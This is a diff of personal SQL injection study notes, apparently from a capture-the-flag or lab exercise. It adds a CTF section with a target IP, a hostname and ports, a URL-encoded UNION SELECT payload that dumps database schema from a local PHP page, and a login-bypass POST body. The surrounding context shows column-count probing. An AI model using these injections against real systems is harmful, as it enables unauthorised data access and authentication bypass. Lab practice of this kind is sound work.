@@ -107,6 +107,7 @@ select carid,size,type,cost,color,year from session.car ;
 select Audi' UNION SELECT 1,2,3,4 #  ## ERROR
 select Audi' UNION SELECT 1,2,3,4,5 #
 ********************************************************************************************************
+
 *************************************-- POST METHOD --**************************************************
 ## 1. Identify vulnerable field //selection
 Ford' OR 1-'1 ## Not vulnerable
@@ -151,6 +152,15 @@ information_schema
 performance_schema
 mysql
 
+
+CTF NOTES--------------------------------------------------
+10.100.28.48: Donovian-nla
+80
+4444
+
+http://127.0.0.1:11201/cases/productsCategory.php?category=1%20UNION%20SELECT%20table_schema,column_name,table_name%20from%20information_schema.columns
+
+username=%27OR+1%3D%271&password=%27OR+1%3D%271&submit=Login
 
 
 
